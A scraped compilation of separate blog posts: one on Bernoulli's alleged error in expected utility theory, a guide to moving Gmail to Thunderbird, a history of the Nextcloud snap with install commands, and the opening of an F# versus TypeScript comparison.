		<p>Not all academic fields have a clear starting point, a seminal paper that constitutes the foundation of the entire discipline. But economics does. The paper that defines modern formal economics was written by Daniel Bernoulli in 1738. It introduces expected utility theory. The main thrust of our work is, of course, to replace expected utility theory and instead work with time-average growth rates of wealth. I’ll mention how that works, but the focus of this post will be on something else. Bernoulli’s paper is not only conceptually misleading but also technically flawed in a sneaky way that keeps confusing everyone. Where Bernoulli determines the price to be paid for a risky prospect, he contradicts himself. I wouldn’t make such a fuss about this if the paper wasn’t so absolutely crucial. This basis of economics contains an error that invalidates commonly held beliefs and puts tens of thousands of studies into a different light. I recently <a href="https://twitter.com/ole_b_peters/status/963084568831119361">encouraged people, using twitter,</a> to read the paper and see for themselves. In this blog post I go through the relevant analysis step by step and address questions that came up in response to the tweet.</p>

<h2>Preliminaries</h2>
<p>Bernoulli’s paper was re-published in 1954 in <a href="https://www.econometricsociety.org/publications/econometrica/1954/01/01/exposition-new-theory-measurement-risk">Econometrica</a> (if you don’t like paywalls, here’s a <a href="http://bit.ly/2nShXn5">free pdf</a>). This is the standard translation from Latin, and page numbers below refer to it. I have not read the original Latin paper, but the error is spelled out in words, visually in a figure, and also in an equation, so this is not something lost in translation. If you have a copy of the original, please send it to me. <em>[2018-02-18 addendum: a scan of the original is <a href="https://archive.org/details/SpecimenTheoriaeNovaeDeMensuraSortis" target="_blank" rel="noopener">here</a>.]</em> The paper is so fundamental to economics that more than 200 years after its publication it was fished out of the proceedings of the Papers of the Imperial Academy of Sciences in Petersburg (Vol. V, 1738, pp. 175-192), translated into English, and published in the leading journal of the field.</p>
<h2>What is expected utility theory?</h2>
<p>Expected utility theory (EUT) is a form of decision theory. Imagine someone offers you a lottery ticket. Prior to Bernoulli, it was assumed that people roughly maximize the expected change in wealth resulting from such a gamble. That is, if initial wealth is <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)"> and possible changes in wealth are <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> then you’d maximize</p>
<p>(Eq.1)&nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+x%28t%2B%5Cdelta+t%29+-+x%28t%29+%5Crangle+%3D+%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle" title="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle">.</p>
<p>Here, <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Ccdot+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \cdot \rangle" title="\langle \cdot \rangle"> is the expectation operator. Some people like to denote it by <img src="https://s0.wp.com/latex.php?latex=%5Cmathbb%7BE%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\mathbb{E}" title="\mathbb{E}"> but it’s same thing. If <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x\rangle" title="\langle \delta x\rangle"> is positive, you’d buy the ticket, if it’s negative, you wouldn’t. But observations soon convinced everyone that this is not how people behave.</p>
<p>EUT was introduced as a refinement of this decision criterion. It says that you will choose the action that maximizes the expected change, not of your wealth but of your utility. The insight here is that people don’t evaluate gambles in isolation but with respect to a reference level (their initial wealth). An extra dollar is worth less to me if I’m rich than if I’m poor. Mathematically, a so-called utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)"> is introduced, where <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> represents wealth.</p>
<p>The most commonly used utility function is <img src="https://s0.wp.com/latex.php?latex=u%28x%29%3D%5Clog+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)=\log x" title="u(x)=\log x">. This is motivated by assuming that the extra utility someone attaches to an extra dollar is inversely proportional to the wealth that that someone already has, p.25:</p>

<p>Later on Bernoulli writes this assumption as the differential equation <img src="https://s0.wp.com/latex.php?latex=du+%3D+1%2Fx+dx&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="du = 1/x dx" title="du = 1/x dx">, whose solution is the logarithm. Let’s write down what EUT wants us to maximize:</p>
<p>(Eq.2) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Clangle+%5Cln%5Bx%28t%2B%5Cdelta+t%29%5D-%5Cln%5Bx%28t%29%5D+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle" title="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle">.</p>
<h3>What’s our conceptual critique?</h3>
<p>By re-writing this object you will immediately see that it actually means something else, and that’s the essence of our conceptual critique. Logarithms turn division into subtraction, <img src="https://s0.wp.com/latex.php?latex=%5Cln%28a%2Fb%29%3D%5Cln+a+-%5Cln+b&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln(a/b)=\ln a -\ln b" title="\ln(a/b)=\ln a -\ln b">. So (Eq.2) can be re-written as</p>
<p>(Eq.3) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>Now divide both sides by <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"></p>
<p>(Eq.4) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Cfrac%7B1%7D%7B%5Cdelta+t%7D%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cfrac%7B1%7D%7B%5Cdelta+t%7D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>What’s this? In any field other than economics, this object is called the expected exponential growth rate of wealth. No utility required, no psychology required. Digging just a little bit deeper, the whole story comes to light. Wealth dynamics are fundamentally multiplicative — we can invest wealth to generate more wealth. For such dynamics the exponential growth rate is an ergodic observable, which means its expectation value tells us what happens in the long run. Mystery solved! People just optimize what happens to their wealth over time. Crucially, additive wealth changes, <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> are not ergodic, wherefore the expectation value in (Eq.1) does NOT tell us what happens over time.</p>
<p>Economics textbooks and papers miss this point. The problem is treated in an a-temporal space, as a so-called “one-shot game”. The mathematics is the mathematics of things happening in parallel universes, not of things happening over time. Where time is mentioned, it is usually wrongly assumed that <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x \rangle" title="\langle \delta x \rangle"> indicates what happens over time. Endless arguments ensue over whether <img src="https://s0.wp.com/latex.php?latex=%5Cln+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln x" title="\ln x"> is the correct psychological re-weighting people apply to wealth — in reality this is a question about dynamics, with psychology as a second-order effect — of course we can be deceived, confused, or stupid and not act in our best interest. It’s also far from easy to put a number on wealth <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)">, or indeed on the different <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> and their probabilities involved in real-world decisions.</p>
<p>The history of economics is a wonderful example of how a basic conceptual error prevents the detection of technical errors and inconsistencies. Without the right concepts it’s just not possible to ask the right questions, let alone find consistent answers.</p>
<h3>How much would I pay for a lottery ticket?</h3>
<p>Let’s put our conceptual troubles aside for a moment and use EUT to address precisely one of the questions Bernoulli asked. My initial wealth is <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, I have to pay a ticket fee <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F">, and I can win prizes <img src="https://s0.wp.com/latex.php?latex=G%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(n)" title="G(n)"> with probabilities <img src="https://s0.wp.com/latex.php?latex=p%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="p(n)" title="p(n)">, where <img src="https://s0.wp.com/latex.php?latex=1%5Cleq+n+%5Cleq+N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="1\leq n \leq N" title="1\leq n \leq N"> is a random integer denoting which of the <img src="https://s0.wp.com/latex.php?latex=N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="N" title="N"> possible prizes I win. We imagine the lottery to take a time <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"> that doesn’t depend on which prize is won.</p>
<p>EUT says: find the value <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}"> that makes the expected change in utility zero. If I pay more, the lottery will have a negative expected utility change, and EUT would advise me not to take part. Mathematically, here is the object we have to compute:</p>
<p>(Eq.5) &nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle%5Cdelta+u+%5Crangle%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29-F%29+-+u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)" title="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)"></p>
<p>That’s it. Now vary <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> so that the expected change in utility becomes zero. The value of <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> where that happens is the maximum fee I should pay for the lottery.</p>
<h2>Bernoulli’s error</h2>
<p>Bernoulli makes an error when he talks about this fee. The key figure is on p.26, and I’ve scribbled in red a translation of Bernoulli’s notation into the symbols used in <a href="https://doi.org/10.1063/1.4940236" target="_blank" rel="noopener">Peters and Gell-Mann (2016)</a>.</p>

<p>Let me talk you through the figure. The horizontal axis represents wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, and the vertical axis represents utility, so that the solid curve is the utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)">.</p>
<p>Let’s focus on the solid horizontal line first. The point B is the initial wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">. The point p, to the left of B, represents the wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, that is, the initial wealth minus the ticket fee. The points C, D, E, F are wealth levels arrived at by adding to the initial wealth one of the possible prizes <img src="https://s0.wp.com/latex.php?latex=G%281%29%2C+G%282%29%2C+G%283%29%2C+G%284%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1), G(2), G(3), G(4)" title="G(1), G(2), G(3), G(4)">.</p>
<p>You may already suspect the problem: let’s imagine outcome 1 occurs in the lottery, meaning we receive the prize <img src="https://s0.wp.com/latex.php?latex=G%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1)" title="G(1)">. In that case, our wealth will change to <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)-F" title="x+G(1)-F">, and not <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)" title="x+G(1)"> (which is the position of point C). We have to subtract the fee! The points C, D, E, F marked by Bernoulli have no relevance to the problem (unless the fee is zero).</p>
<p>Now let’s walk along the utility curve. The point o marks the utility of&nbsp; wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, so that the dashed line po is the drop in utility associated with a drop in wealth from <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> to <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">. The points G, H, L, M (to the right of B along the utility curve) represent the utilities associated with the irrelevant wealth levels <img src="https://s0.wp.com/latex.php?latex=u%28x%2BG%281%29%29%2C+u%28x%2BG%282%29%29%2C+u%28x%2BG%283%29%29%2C+u%28x%2BG%284%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))" title="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))">. The point O represents the expected utility assuming prizes are received with their respective probabilities <span><em>but no fee is paid</em></span>, p.26</p>

<p>In <a href="https://doi.org/10.1063/1.4940236">Peters and Gell-Mann (2016)</a> we call this object <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle+%3A%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))" title="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))">, for want of a better symbol.</p>
<p>Now comes Bernoulli’s error. He claims that the lottery is to be valued by comparing <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle" title="\langle \delta u^+ \rangle"> to the loss in utility one would suffer if one were to buy the lottery ticket for its fee but not receive any prize. The key passage is on p.26–27</p>

<p>This amounts to a decision criterion, different from (Eq.5) and inconsistent with EUT. We denote with the symbol <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta u^-" title="\delta u^-"> what Bernoulli calls “the disutility to be suffered by losing” (Bp in his notation). Now we can write Bernoulli’s decision criterion in symbols. Bernoulli tells us to buy a ticket if the following quantity is positive, and not to buy it if it’s negative</p>
<p>(Eq.6) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+-+%5Cdelta+u%5E-+%3D+%5Cunderbrace%7B%5Clangle+u%28x%2BG%29+%5Crangle+-+u%28x%29%7D_%7B+%5Clangle+%5Cdelta+u%5E%2B%5Crangle%7D+-+%5Cunderbrace%7B%5Bu%28x%29+-+u%28x-F%29%5D%7D_%7B%5Cdelta+u%5E-%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}" title="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}">.</p>
<h2>Error or different model?</h2>
<p>In principle, one could now say that Bernoulli just had a different model of people’s behavior than does modern economics. That would be bad enough because modern economics claims that it has the same model as Bernoulli. It’s more likely that Bernoulli got confused specifically when he tried to find the maximum fee. Otherwise he seems consistent with EUT, for instance on p.24, where he describes the certain profit (“the value of the risk in question”) that corresponds to an uncertain profit</p>

<p>Let’s really kill this. Why is (Eq.6) not a good decision criterion?</p>
<ol>
<li>It is easy to construct an example where the maximum fee I should pay, <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}">, is smaller than the smallest possible prize in the lottery, but the criterion still tells me to refrain from buying a ticket. That makes no sense: such a lottery has no downside risk. I’m guaranteed a positive net profit, the only uncertain element is how much better off I will be after the game. Intriguingly — have another look at the figure — the maximum fee calculated by Bernoulli <em>is </em>smaller than the smallest possible prize, assuming that one of the prizes will be won (the distance between B and p is smaller than the distance between B and C).</li>
<li>Another problem is this: how much should I be willing to pay for one dollar, according to Bernoulli? What? … for one dollar? One dollar, of course! Yes, but not according to Bernoulli. Try it out: <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+%3C+%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle < \delta u^-" title="\langle \delta u^+\rangle < \delta u^-"> for any non-zero number of dollars I buy in dollars, due to the concavity of the utility function. …</li></ol></div></article></div>

							<div><p>How to download all your emails from Gmail and read them somewhere else. And maybe a bit of why to do so…</p>
<p>Google reads your emails and sells your stuff to other companies – maybe. Who really knows? You can agree to their privacy policy, but do you really know in how many ways you as a Google user can be monetized? Maybe this sounds like a conspiracy theory. The bottom line is that I don’t want to be that +1 to Google so Google can sell my data or do whatever it does all under pretense that it will be better ‘experience’ for me at the end. There are many other reasons people decide do leave Google.</p>
<p>Read some of the stories :</p>

</ul>
<p>Whether you despise Google and want out or are interested in playing with .mbox files here is how to do it.</p>
<h3>Goodbye Gmail</h3>
<p>When you decide to leave Gmail, you will want to do something with all you messages. Let say you want to download them and use them offline. Google makes it easy for you to download your data using <a href="https://takeout.google.com/">Google Takeout.</a> Fololow the link and since you want only email messages, click on <em>Deselect all</em> and check Mail like on the picture below.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png" alt="" width="1189" height="273" srcset="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png 1189w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-300x69.png 300w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-1024x235.png 1024w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-768x176.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>Scroll to the bottom and go through next couple of steps. At the end, you will get a message saying something like Google is working on it and you will get another message some time later with a download link for your data. I find their download page a bit confusing, but maybe that is just me. Download what is offered. Look for the .mbox file afterwards. If you used Gmail for several years it will be couple of GB big.</p>
<p>Next thing to do is find a way to read the emails from this .mbox file. I asked around a bit, goducked as well {guys on <a href="https://fosstodon.org/">fosstodon</a> [<a href="https://joinmastodon.org/">masstodon</a> (like twitter but better) instance for foss geeks and other peculiar characters] were helpful} and decided to use Thunderbird portable to read my .mbox file with emails.</p>
<h3>Hello Thunderbird</h3>
<p>The idea is simple: install a mail client that can read .mbox file and then import/open the file into/with the client. Thunderbird portable* can do just so. You can download it <a href="https://portableapps.com/apps/internet/thunderbird_portable">here</a>. If you want to use regular Thunderbird, you can. I have chosen portable version because I wanted to put everything (client and emails) on my USB drive and run it from there. The setup is pretty much the same for portable and regular app. After you installed Thunderbird, cheat your way through the new account setup in order get past setup dialogs and for local folders to appear in the main screen (look at the picture below) or follow the procedure as described <a href="https://commons.lbl.gov/display/~jwelcher@lbl.gov/Reading+an+mbox+file+with+Thunderbird">here</a>.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/local-folders-150x98.png" alt="" width="194" height="98"></p>
<p>Depending on how you cheated so far, there should be some kind of account created and some other folders. Go to <em>Options –&gt; Account settings</em> and delete all accounts. You should be left with local folders only. Check the <em>Outgoing server</em> if you like just in case some unwanted settings ended up there.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png" alt="" width="600" height="349" srcset="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png 600w, https://effilicious.com/wp-content/uploads/2020/07/delete-account-300x175.png 300w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Next thing to do is importing .mbox file into Thunderbird. You can do it by moving your .mbox file to your Thunderbird local directory. Look at the picture above. There is the path to the directory. Put the .mbox file there,restart Thunderbird and give it some time to deal with the .mbox file. After it finishes there should be a new folder in Local Folders with all your emails in it. Rename it to something wild like My exGmail…</p>
<hr>
<p>*there are probably many other email clients that can deal with mailbox file</p></div>

July 3, 2020 | https://kyrofa.com/posts/four-years-of-nextcloud | <a href="https://web.archive.org/web/*/https://kyrofa.com/posts/four-years-of-nextcloud">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="mediumInsert-94"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/96/nextcloud-19-login.jpg" alt=""></figure></div><p>I'm a few weeks late on celebrating Nextcloud's four year anniversary, but I'm doing it anyway! My how time flies. I became a part of the ownCloud community back in 2012. Heck, you can still find blog posts about how I ran it on this very blog if you scroll down far enough. Then, in 2015, I saw the post about the <a href="https://owncloud.org/news/western-digital-and-owncloud-team-up-to-bring-owncloud-to-home-users/">Western Digital/ownCloud</a> collaboration on what would eventually become the Nextcloud Box. But I'm getting ahead of myself.<br></p><p>The timing was excellent. We at Canonical were busy developing <a href="https://snapcraft.io/">Ubuntu Core and snaps</a>, and I had just recently joined the team responsible for developing snapcraft, the tool that creates snaps. I thought "What better way to learn the ins and outs of what I'm making than to participate in this competition!" So a few ownCloud community members and I worked on <a href="https://www.mail-archive.com/devel@owncloud.org/msg02257.html">exactly that</a>. It was ultimately selected as the platform to ship on the Box, <a href="https://karlitschek.de/2016/04/big-changes-i-am-leaving-owncloud-inc-today/">just in time to lose</a> every <a href="https://blog.jospoortvliet.com/2016/05/moving-on-from-owncloud.html">contact I had at ownCloud</a>.</p><p>I was disappointed. I assumed the project was dead. Then I heard from my friends, and was told about Nextcloud. And they retained the Western Digital contacts, who now wanted to continue the project with them!</p><p>I was excited. Within days of Nextcloud making their first release I had created a Nextcloud snap. You can still use Nextcloud v9 today, in fact:</p><pre>$ sudo snap install nextcloud --channel=9</pre><p>I'll always have fond memories of those pixelated clouds.</p><div id="mediumInsert-5"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/89/nextcloud-9.jpg" alt=""></figure></div><p>I was very happy with it. A one-line installation method for a production-ready Nextcloud. Let's Encrypt integration. Everything. Despite being created to enable the Nextcloud Box, we made sure that it worked on all architectures, so folks could run it wherever they wanted to.<br></p><p>Before too long, the <a href="https://nextcloud.com/box/">Nextcloud Box</a> became a reality, becoming a joint project between Nextcloud, Western Digital Labs, and Canonical (where Canonical was maintaining the image). At that time, we were actually having to patch Nextcloud to make it work the way we needed it to. We had tried upstreaming that patch to ownCloud, but they turned it down. Which means if you look at the config file you'll see a dirty little secret:</p><pre>/**<br> * Nextcloud doesn't support hosting the config file out of the application, so<br> * this version of Nextcloud has been patched slightly to allow for it. As a<br> * result, we fail the integrity check, so we'll just disable it.<br> */<br>'integrity.check.disabled' =&gt; true,<br></pre><p>Which I why I remember the Nextcloud v10 release so well: <a href="https://github.com/nextcloud/server/pull/1081">Nextcloud didn't have the same problem with that patch</a>, and as of v10 we no longer needed to patch it, and could re-enable the integrity check!<br></p><pre>$ sudo snap install nextcloud --channel=10<br></pre><div id="mediumInsert-11"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/90/nextcloud-10.jpg" alt=""></figure></div><p>That was a solid release, but it wasn't long before v11 was released with all sorts of security features and a preview of what was to become Nextcloud Talk in a few years:</p><pre>$ sudo snap install nextcloud --channel=11</pre><p>There was a lot of similarity between versions 9, 10, and 11, but a ton of new development went into version 12. That was great, but it also meant that a number things broke in version 12. Snaps automatically update, and this is when we really took <i>ownership</i> of that responsibility. We decided we weren't cool automatically breaking people. We've continued that attitude today, so if you've wondered why the snap lags upstream occasionally, that's why. Anyway, eventually the issues were resolved, and we got everyone onto v12:</p><pre>$ sudo snap install nextcloud --channel=12</pre><p>This release finally got rid of that dual menu setup (app menu on the left, settings/users on the right) and unified them really nicely:</p><div id="mediumInsert-34"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/92/nextcloud-12.jpg" alt=""></figure></div><p>Version 12 is still one of my favorite releases simply because no new major releases came out for almost a year. Sadly, it was also during this timeframe that Western Digital Labs shut down, thus ending the Nextcloud Box, and thus officially turning the Nextcloud snap into a personal project for me. Despite that, we settled into a groove of maintenance, and our userbase (and group of testers, who are amazing) grew significantly.<br></p><p>Version 13 saw quite a leap in functionality and design:<br></p><pre>$ sudo snap install nextcloud --channel=13</pre><p>For example, this is where Nextcloud Talk officially made its debut. It's also where they got rid of those pixelated clouds and replaced them with a nice abstract banner:<br></p><div id="mediumInsert-23"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/91/nextcloud-13.jpg" alt=""></figure></div><p>It was only a few months before the update drum started for v14, which came with all sorts of stuff like SMS 2FA and GDPR compliance:</p><pre>$ sudo snap install nextcloud --channel=14</pre><p>Nextcloud 15 took that even further:</p><pre>$ sudo snap install nextcloud --channel=15</pre><p>This is the release that added support for my beloved Yubikey, U2F, and TOTP. This is also where they introduced Nextcloud Social for a federated social network.</p><div id="mediumInsert-51"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/93/nextcloud-15.jpg" alt=""></figure></div><p>Nextcloud 16 came with a much-improved Nextcloud Talk, as well as more fine-grained permissions by way of an access control list:</p><pre>$ sudo snap install nextcloud --channel=16</pre><p>Version 17 is where the remote wipe functionality made its debut, and the shiny new Text app was introduced as the default text editor:</p><pre>$ sudo snap install nextcloud --channel=17</pre><div id="mediumInsert-71"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/94/nextcloud-17.jpg" alt=""></figure></div><p>Nextcloud 18 saw a slight rebranding. They started calling it Nextcloud Hub, and made it super easy to preinstall "recommended" apps, which included Only Office for collaborative document editing:</p><pre>$ sudo snap install nextcloud --channel=18</pre><p>And now we come to current day, version 19, where they switched to Collabora for collaborative document editing instead of Only Office:</p><pre>$ sudo snap install nextcloud --channel=19</pre><div id="mediumInsert-93"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/95/nextcloud-19.jpg" alt=""></figure></div><p>Along with Nextcloud 19, we at Canonical have started the <a href="https://ubuntu.com/appliance">Ubuntu Appliance portfolio</a>, which <a href="https://ubuntu.com/appliance/nextcloud">includes Nextcloud</a>. This is essentially a bring-your-own-box Nextcloud Box: an image with the Nextcloud snap already on there, waiting to be flashed onto a Raspberry Pi or a NUC or something. As soon as it's flashed and booted, you have a Nextcloud install.</p><p>Anyway, I hope this brief walk through history was interesting. Note that all the snap tracks used here will be open forever, so you're welcome to use even the first Nextcloud, but as a general rule of thumb, only the two most recent major releases are actually supported and receive updates. Of course, if you just want the latest stable version, you don't need to specify a track at all:</p><pre>$ sudo snap install nextcloud<br></pre><p>It's been a good four years. Here's to many more!<br></p>

        <article>
    
    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
